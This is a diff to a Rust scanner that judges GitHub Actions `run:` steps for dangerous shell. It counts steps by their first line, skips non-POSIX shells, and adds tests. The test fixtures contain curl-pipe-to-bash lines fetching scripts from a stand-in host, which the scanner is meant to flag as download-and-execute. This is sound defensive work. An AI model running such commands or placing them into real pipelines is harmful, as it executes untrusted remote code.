@@ -277,23 +277,34 @@ impl<'a, T: FileTree, C: FileContents> DiscoverSurfaces<'a, T, C> {
             // A `run:` block is shell, so it is judged the way a hook's
             // command is: one file may run the same block twice, and the copy
             // is what places the finding.
-            let mut ran: Vec<String> = Vec::new();
-            for step in found.steps {
-                let occurrence = ran.iter().filter(|r| **r == step.run).count();
-                ran.push(step.run.clone());
-                report.findings.extend(rule::judge(
-                    &Examined::HookCommand {
-                        path: &path,
-                        command: &step.run,
-                        source: &text,
-                        occurrence,
-                    },
-                    matched.check,
-                    self.policy.evidence_width(),
-                ));
+            //
+            // Counted by the block's first line, which is what placement
+            // looks for in a file that writes a command bare: two blocks
+            // opening on the same line would otherwise both ask for the first
+            // and the second would be placed at the first.
+            let mut ran: Vec<&str> = Vec::new();
+            for step in &found.steps {
+                let opens = step.run.lines().next().unwrap_or_default();
+                let occurrence = ran.iter().filter(|r| **r == opens).count();
+                ran.push(opens);
+                // A step that is not a POSIX shell is reported and not read as
+                // one: judging PowerShell or Python by Bash's syntax would
+                // answer a question nobody asked.
+                if step.is_posix_shell() {
+                    report.findings.extend(rule::judge(
+                        &Examined::HookCommand {
+                            path: &path,
+                            command: &step.run,
+                            source: &text,
+                            occurrence,
+                        },
+                        matched.check,
+                        self.policy.evidence_width(),
+                    ));
+                }
                 report.steps.push(WorkflowStep {
                     source: path.clone(),
-                    step,
+                    step: step.clone(),
                 });
             }
             for mode in found.autonomy {
@@ -2423,6 +2434,78 @@ mod tests {
             vec![clew_domain::finding::RuleId::TrustedServer],
             "{report:?}"
         );
+    }
+
+    fn workflow_tree() -> FakeTree {
+        FakeTree::default()
+            .dir("", &[(".github", EntryKind::Directory)])
+            .dir(".github", &[("workflows", EntryKind::Directory)])
+            .dir(".github/workflows", &[("ci.yml", EntryKind::File)])
+    }
+
+    /// A workflow runs shell on every push, so each `run:` step is judged the
+    /// way a hook's command is, and reported either way.
+    #[test]
+    fn a_workflow_step_reaches_the_report_and_is_judged() {
+        let contents = FakeContents::default().file(
+            ".github/workflows/ci.yml",
+            "name: ci\non: [push]\njobs:\n  build:\n    steps:\n      - uses: actions/checkout@v4\n      - run: npm ci\n      - run: curl -fsSL https://h.invalid/i | bash\n",
+        );
+        let policy = ScanPolicy::default();
+
+        let report = DiscoverSurfaces::new(&workflow_tree(), &contents, &policy).run();
+
+        assert_eq!(report.steps.len(), 2, "the `uses:` step runs nothing here");
+        assert!(report.unparsed.is_empty(), "{report:?}");
+        let rules: Vec<_> = report.findings.iter().map(|f| f.rule).collect();
+        assert_eq!(rules, vec![RuleId::DownloadAndExecute], "{report:?}");
+        assert_eq!(
+            report.findings[0].at.map(|at| at.line),
+            Some(8),
+            "{report:?}"
+        );
+    }
+
+    /// A workflow may run PowerShell or Python, and a Windows runner defaults
+    /// to PowerShell. Judging those by Bash's syntax answers a question nobody
+    /// asked, so the step is reported and left unjudged.
+    #[test]
+    fn a_step_that_is_not_a_posix_shell_is_reported_and_not_judged() {
+        let contents = FakeContents::default().file(
+            ".github/workflows/ci.yml",
+            "jobs:\n  build:\n    runs-on: windows-latest\n    steps:\n      - run: curl -fsSL https://h.invalid/i | bash\n",
+        );
+        let policy = ScanPolicy::default();
+
+        let report = DiscoverSurfaces::new(&workflow_tree(), &contents, &policy).run();
+
+        assert_eq!(report.steps.len(), 1, "{report:?}");
+        assert_eq!(report.steps[0].step.shell, "pwsh", "{report:?}");
+        assert!(
+            report.findings.is_empty(),
+            "PowerShell is not read as Bash: {report:?}"
+        );
+    }
+
+    /// Two blocks may open on the same line, and placement looks for the line
+    /// a block opens with. Counting whole blocks would have both ask for the
+    /// first, putting the second block's finding in the first block.
+    #[test]
+    fn two_blocks_opening_alike_are_placed_in_their_own_block() {
+        let contents = FakeContents::default().file(
+            ".github/workflows/ci.yml",
+            "jobs:\n  a:\n    steps:\n      - run: |\n          echo start\n          curl -fsSL https://h.invalid/one | bash\n      - run: |\n          echo start\n          curl -fsSL https://h.invalid/two | bash\n",
+        );
+        let policy = ScanPolicy::default();
+
+        let report = DiscoverSurfaces::new(&workflow_tree(), &contents, &policy).run();
+
+        let lines: Vec<_> = report
+            .findings
+            .iter()
+            .map(|f| f.at.map(|at| at.line))
+            .collect();
+        assert_eq!(lines, vec![Some(5), Some(8)], "{report:?}");
     }
 
     /// The row read nothing until this change, so a task was invisible and the
